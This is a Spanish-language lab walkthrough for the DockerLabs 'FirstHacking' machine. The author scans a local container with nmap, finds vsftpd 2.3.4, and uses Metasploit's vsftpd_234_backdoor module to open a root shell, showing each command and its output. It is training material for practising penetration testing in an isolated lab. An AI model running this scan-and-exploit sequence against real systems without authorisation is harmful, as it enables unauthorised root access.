#escalada #ftp #ssh #hydra #sudo-l #bash_-p 
Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "FirstHacking".
Una vez hecho , descomprimimos el archivo, e inicializamos la maquina con el comando:
```
sudo bash auto_deploy.sh firsthacking.tar
```
Tras desplegarse la maquina, hacemos un NMAP. No necesitamos hacer un ARP-SCAN (o NETDISCOVER), porque ya sabemos la IP de la maquina victima.
```
nmap -p- --open -sCV -sS --min-rate 5000 -n -Pn -vvv 172.17.0.2
```
y vemos que tiene 1 solo puerto abierto, el 21 (FTP):
```
Discovered open port 21/tcp on 172.17.0.2
```
Como no tenemos ni usuario ni contraseña, no podemos entrar directamente. No obstante, en el resultado anterior nos dice:
```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.3.4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Unix
```
Por lo que vemos que tiene una version "vsftpd 2.3.4", asi que buscaremos en Metasploit a ver si hay alguna vulnerabilidad:
```
msf6 > search vsftpd 2.3.4
```
Y nos dice:
```
#  Name                                Disclosure Date  Rank Check  Description
-  ----                                -----------  --------   -----  ---------
0 exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  excellent  No  VSFTPD v2.3.4 Backdoor Command Execution
```
Como se puede observar hay un exploit de "Backdoor Command Execution", por lo que ahora solo tendremos que elegirlo y ver sus opciones:
```
msf6 > use 0   <==== Lo elegimos
[*] No payload configured, defaulting to cmd/unix/interact                                                 
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options   <=== Vemos sus opciones
```
Parece que solo vamos a necesitar poner la IP de la maquina (RHOSTS):
```
Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format
									   type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see
									   https://docs.metasploit.com/docs/using-met
                                       asploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)
```
Por lo que pondremos "set RHOSTS 172.17.0.2" y ejecutamos "run":
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 172.17.0.2
RHOSTS => 172.17.0.2

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
```
Y vemos lo siguiente:
```
[*] 172.17.0.2:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.17.0.2:21 - USER: 331 Please specify the password.
[+] 172.17.0.2:21 - Backdoor service has been spawned, handling...
[+] 172.17.0.2:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (172.17.0.1:35539 -> 172.17.0.2:6200) at 2024-07-07 23:25:21 +0200
```
Ahora si escribimos "whoami" veremos que somos root. No obstante, para obtener un prompt decente, escribiremos tambien "script /dev/null -c bash"
```
whoami
root

script /dev/null -c bash
Script started, file is /dev/null

root@527d8a48acab:~/vsftpd-2.3.4#
```
Y listo, ya estaria la maquina hecha :)
